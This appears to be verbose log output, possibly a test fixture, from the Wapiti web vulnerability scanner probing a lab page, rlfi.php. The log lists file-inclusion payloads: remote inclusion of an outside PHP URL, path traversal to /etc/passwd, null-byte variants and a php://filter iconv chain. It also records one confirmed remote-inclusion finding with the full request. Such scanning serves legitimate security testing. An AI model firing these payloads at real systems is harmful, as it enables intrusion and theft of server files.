+2024-03-20 16:55:49.446 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/rlfi.php?action=go&language=lang_nl.php (1)
+2024-03-20 16:55:49.488 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/rlfi.php (1)
+2024-03-20 16:55:49.497 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=109
+2024-03-20 16:55:49.518 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/rlfi.php (1)
+	data: form_security_level=submit&security_level=2
+2024-03-20 16:55:49.555 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module http_headers
+2024-03-20 16:55:49.566 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/rlfi.php?language=fuzz&action=go (0)
+2024-03-20 16:55:49.574 | BLUE     | wapitiCore.attack.mod_http_headers:check_header:83 - Checking X-Frame-Options:
+2024-03-20 16:55:49.574 | RED      | wapitiCore.attack.mod_http_headers:check_header:85 - X-Frame-Options is not set
+2024-03-20 16:55:49.634 | BLUE     | wapitiCore.attack.mod_http_headers:check_header:83 - Checking X-Content-Type-Options:
+2024-03-20 16:55:49.635 | RED      | wapitiCore.attack.mod_http_headers:check_header:85 - X-Content-Type-Options is not set
+2024-03-20 16:55:49.756 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module file
+2024-03-20 16:55:49.770 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/rlfi.php?language=fuzz&action=go (0)
+2024-03-20 16:55:49.774 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?language=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php&action=go (0)
+2024-03-20 16:55:50.008 | RED      | wapitiCore.attack.mod_file:attack:250 - ---
+2024-03-20 16:55:50.009 | RED      | wapitiCore.attack.mod_file:attack:251 - Remote inclusion vulnerability in http://web/rlfi.php via injection in the parameter language
+2024-03-20 16:55:50.009 | RED      | wapitiCore.attack.mod_file:attack:261 - Evil request:
+2024-03-20 16:55:50.009 | RED      | wapitiCore.attack.mod_file:attack:262 -     GET /rlfi.php?language=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php&action=go HTTP/1.1
+    host: web
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: security_level=0
+2024-03-20 16:55:50.009 | RED      | wapitiCore.attack.mod_file:attack:263 - ---
+2024-03-20 16:55:50.018 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?language=fuzz&action=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php (0)
+2024-03-20 16:55:50.035 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?language=fuzz&action=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php%00 (0)
+2024-03-20 16:55:50.053 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?language=fuzz&action=%2Fetc%2Fpasswd (0)
+2024-03-20 16:55:50.064 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?language=fuzz&action=%2Fetc%2Fpasswd%00 (0)
+2024-03-20 16:55:50.078 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?language=fuzz&action=%2Fetc%2Fservices (0)
+2024-03-20 16:55:50.090 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?language=fuzz&action=%2Fetc%2Fservices%00 (0)
+2024-03-20 16:55:50.102 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?language=fuzz&action=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices (0)
+2024-03-20 16:55:50.114 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?language=fuzz&action=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%00 (0)
+2024-03-20 16:55:50.127 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?language=fuzz&action=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%3A%3A%24DATA (0)
+2024-03-20 16:55:50.145 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?language=fuzz&action=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
+2024-03-20 16:55:50.162 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?language=fuzz&action=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
+2024-03-20 16:55:50.180 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?language=fuzz&action=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%3A%3A%24DATA (0)
+2024-03-20 16:55:50.200 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?language=fuzz&action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Flib%2F (0)
+2024-03-20 16:55:50.218 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?language=fuzz&action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2F (0)
+2024-03-20 16:55:50.235 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?language=fuzz&action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (0)
+2024-03-20 16:55:50.254 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?language=fuzz&action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (0)
+2024-03-20 16:55:50.274 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?language=fuzz&action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (0)
+2024-03-20 16:55:50.295 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?language=fuzz&action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (0)
+2024-03-20 16:55:50.316 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?language=fuzz&action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (0)
+2024-03-20 16:55:50.337 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?language=fuzz&action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (0)
+2024-03-20 16:55:50.356 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?language=fuzz&action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (0)
+2024-03-20 16:55:50.374 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?language=fuzz&action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (0)
+2024-03-20 16:55:50.395 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?language=fuzz&action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
+2024-03-20 16:55:50.417 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?language=fuzz&action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
+2024-03-20 16:55:50.437 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?language=fuzz&action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
+2024-03-20 16:55:50.455 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?language=fuzz&action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
+2024-03-20 16:55:50.474 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?language=fuzz&action=php%3A%2F%2Ffilter%2Fconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.UCS2.UTF-8%7Cconvert.iconv.CSISOLATIN6.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.851.UTF-16%7Cconvert.iconv.L1.T.618BIT%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSA_T500.UTF-32%7Cconvert.iconv.CP857.ISO-2022-JP-3%7Cconvert.iconv.ISO2022JP2.CP775%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM891.CSUNICODE%7Cconvert.iconv.ISO8859-14.ISO6937%7Cconvert.iconv.BIG-FIVE.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L5.UTF-32%7Cconvert.iconv.ISO88594.GB13000%7Cconvert.iconv.BIG5.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1162.UTF32%7Cconvert.iconv.L4.T.61%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.R9.ISO6937%7Cconvert.iconv.OSF00010100.UHC%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.863.UTF-16%7Cconvert.iconv.ISO6937.UTF16LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L6.UNICODE%7Cconvert.iconv.CP1282.ISO-IR-90%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.BIG5HKSCS.UTF16%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF16%7Cconvert.iconv.ISO6937.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF32%7Cconvert.iconv.L6.UCS-2%7Cconvert.iconv.UTF-16LE.T.61-8BIT%7Cconvert.iconv.865.UCS-4LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.MAC.UTF16%7Cconvert.iconv.L8.UTF16BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSIBM1161.UNICODE%7Cconvert.iconv.ISO-IR-156.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.INIS.UTF16%7Cconvert.iconv.CSIBM1133.IBM943%7Cconvert.iconv.IBM932.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.base64-decode%2Fresource%3Dphp%3A%2F%2Ftemp (0)
+2024-03-20 16:55:50.493 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?language=fuzz&action=go%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (0)
+2024-03-20 16:55:50.514 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?language=fuzz&action=go%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (0)
+2024-03-20 16:55:50.534 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?language=fuzz&action=go%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (0)
+2024-03-20 16:55:50.553 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?language=fuzz&action=go%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (0)
+2024-03-20 16:55:50.572 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?language=fuzz&action=go%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (0)
+2024-03-20 16:55:50.590 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?language=fuzz&action=go%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (0)
+2024-03-20 16:55:50.608 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?language=fuzz&action=go%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (0)
+2024-03-20 16:55:50.627 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?language=fuzz&action=go%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (0)
+2024-03-20 16:55:50.647 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?language=fuzz&action=go%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
+2024-03-20 16:55:50.666 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?language=fuzz&action=go%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
+2024-03-20 16:55:50.684 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?language=fuzz&action=go%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
+2024-03-20 16:55:50.704 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?language=fuzz&action=go%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
+2024-03-20 16:55:50.722 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?language=fuzz&action=go%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (0)
+2024-03-20 16:55:50.741 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?language=fuzz&action=go%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (0)
+2024-03-20 16:55:50.759 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?language=fuzz&action=go%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (0)
+2024-03-20 16:55:50.779 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?language=fuzz&action=go%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (0)
+2024-03-20 16:55:50.799 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?language=fuzz&action=go%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (0)
+2024-03-20 16:55:50.818 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?language=fuzz&action=go%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (0)
+2024-03-20 16:55:50.838 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?language=fuzz&action=go%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (0)
+2024-03-20 16:55:50.856 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?language=fuzz&action=go%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (0)
+2024-03-20 16:55:50.875 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?language=fuzz&action=go%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
+2024-03-20 16:55:50.896 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?language=fuzz&action=go%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
+2024-03-20 16:55:50.915 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?language=fuzz&action=go%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
+2024-03-20 16:55:50.933 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?language=fuzz&action=go%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
+2024-03-20 16:55:50.950 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?language=fuzz&action=file%3A%2F%2F%2Fetc%2Fpasswd (0)
+2024-03-20 16:55:50.968 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?language=fuzz&action=file%3A%2F%2FC%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices (0)
+2024-03-20 16:55:50.989 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?language=fuzz&action=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd (0)
+2024-03-20 16:55:51.005 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?language=fuzz&action=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd%00 (0)
+2024-03-20 16:55:51.018 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?language=fuzz&action=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices (0)
+2024-03-20 16:55:51.031 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?language=fuzz&action=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices%00 (0)
+2024-03-20 16:55:51.044 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?language=fuzz&action=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
+2024-03-20 16:55:51.056 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?language=fuzz&action=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
+2024-03-20 16:55:51.069 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?language=fuzz&action=rlfi.php (0)
+2024-03-20 16:55:51.080 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?language=fuzz&action=rlfi.php%00 (0)
+2024-03-20 16:55:51.093 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?language=fuzz&action=rlfi.php%3A%3A%24DATA (0)
+2024-03-20 16:55:51.116 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/rlfi.php?action=go&language=lang_nl.php (1)
+2024-03-20 16:55:51.118 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?action=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php&language=lang_nl.php (1)
+2024-03-20 16:55:51.127 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?action=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php%00&language=lang_nl.php (1)
+2024-03-20 16:55:51.137 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?action=%2Fetc%2Fpasswd&language=lang_nl.php (1)
+2024-03-20 16:55:51.148 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?action=%2Fetc%2Fpasswd%00&language=lang_nl.php (1)
+2024-03-20 16:55:51.160 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?action=%2Fetc%2Fservices&language=lang_nl.php (1)
+2024-03-20 16:55:51.175 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?action=%2Fetc%2Fservices%00&language=lang_nl.php (1)
+2024-03-20 16:55:51.188 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?action=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices&language=lang_nl.php (1)
+2024-03-20 16:55:51.203 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?action=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%00&language=lang_nl.php (1)
+2024-03-20 16:55:51.216 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?action=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%3A%3A%24DATA&language=lang_nl.php (1)
+2024-03-20 16:55:51.231 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?action=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&language=lang_nl.php (1)
+2024-03-20 16:55:51.246 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?action=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&language=lang_nl.php (1)
+2024-03-20 16:55:51.256 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?action=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%3A%3A%24DATA&language=lang_nl.php (1)
+2024-03-20 16:55:51.265 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Flib%2F&language=lang_nl.php (1)
